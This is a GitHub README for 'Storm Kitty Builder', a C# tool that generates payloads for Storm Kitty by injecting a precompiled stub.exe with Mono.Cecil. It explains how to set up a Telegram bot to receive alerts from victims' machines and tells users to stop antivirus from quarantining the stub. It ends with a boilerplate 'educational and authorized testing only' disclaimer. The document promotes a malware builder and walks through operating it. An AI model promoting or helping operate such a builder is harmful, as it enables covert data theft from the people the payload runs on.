<h1 align="center">⚡ Storm Kitty Builder</h1>

<p align="center">
  <img src="https://img.shields.io/badge/status-active-brightgreen.svg" />
  <img src="https://img.shields.io/badge/language-C%23-blue.svg" />
  <img src="https://img.shields.io/github/license/Vector-OS/Storm-Kitty-Builder.svg" />
</p>

<p align="center">
  <strong>Storm Kitty Builder is a clean and efficient builder designed for creating customizable payloads for Storm Kitty. Fully supports Telegram-based alerts and leverages Mono.Cecil for dynamic assembly manipulation.</strong>
</p>

---

## 🚀 Features

- ✅ Standalone EXE builder interface
- 🧩 Modular stub and payload integration
- 📡 Telegram bot support for real-time notifications
- 🧬 Uses Mono.Cecil to inject and manipulate assemblies
- 📁 Organized and clean project layout

---

## 📦 Requirements

To build and use Storm Kitty Builder, ensure the following:

- .NET Framework (4.x recommended)
- Windows OS (for builder GUI & stub execution)
- Optional: Visual Studio Code or Visual Studio for code editing

---

## 🤖 Telegram Bot Setup

Storm Kitty Builder supports Telegram integration for live alert delivery. To enable:

1. Open Telegram and start a chat with [@BotFather](https://t.me/BotFather).
2. Run `/newbot`, assign it a name and username (e.g., `StormKittyNotifierBot`).
3. Copy your bot token.
4. Replace the placeholder `TELEGRAM_BOT_TOKEN` and `CHAT_ID` in your configuration file or code.
5. Get your `CHAT_ID` by sending a message to your bot and visiting:  
   `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`

```csharp
// Example
string telegramToken = "YOUR_TELEGRAM_BOT_TOKEN";
string chatId = "YOUR_TELEGRAM_CHAT_ID";
````

---

## 🧪 How to Use

1. Download or clone the repository:

   ```bash
   git clone https://github.com/Vector-OS/Storm-Kitty-Builder
   ```

2. Open the solution in Visual Studio or run the `StormKittyBuilder.exe` directly.

3. Configure Telegram credentials inside the builder interface or config file.

4. Click **Build** to generate the payload using the `stub.exe`.

---

## 📁 Project Structure

```
Storm-Kitty-Builder/
│
├── .vscode/                  # VS Code settings (optional)
│
├── StormKittyBuilder/        # Main builder logic and resources
│
├── stub/                     # Stub directory
│   └── stub.exe              # Precompiled stub used in payload creation
│
├── Mono.Cecil.dll            # Core Mono.Cecil library
├── Mono.Cecil.Mdb.dll        # Mono.Cecil debug support
├── Mono.Cecil.Pdb.dll        # Mono.Cecil PDB support
├── Mono.Cecil.Rocks.dll      # Mono.Cecil extensions
│
├── StormKittyBuilder.exe     # Compiled builder application
├── Readme.txt                # Legacy usage info
├── debug.txt                 # Debugging output log
├── LICENSE                   # Project license
└── README.md                 # You're reading it!
```

---

## 📌 Notes

* Make sure your antivirus does not block or quarantine `stub.exe` or `StormKittyBuilder.exe` during testing.
* Telegram alerts must have a valid bot token and chat ID.
* Always test in a controlled, secure environment.

---

## ⚠️ Disclaimer

> This tool is intended strictly for **educational and authorized penetration testing purposes only**.
> The developer is **not responsible** for any illegal use or damage caused by this tool.

---

## ⭐ Support & Contribution

If you find this project helpful:

* ⭐ Star the repository
* 🛠️ Submit feature requests or issues
* 🤝 Pull requests are welcome!

---

<p align="center">
  Crafted with ⚡ by <a href="https://github.com/Vector-OS">Vector-OS</a>
</p>
```

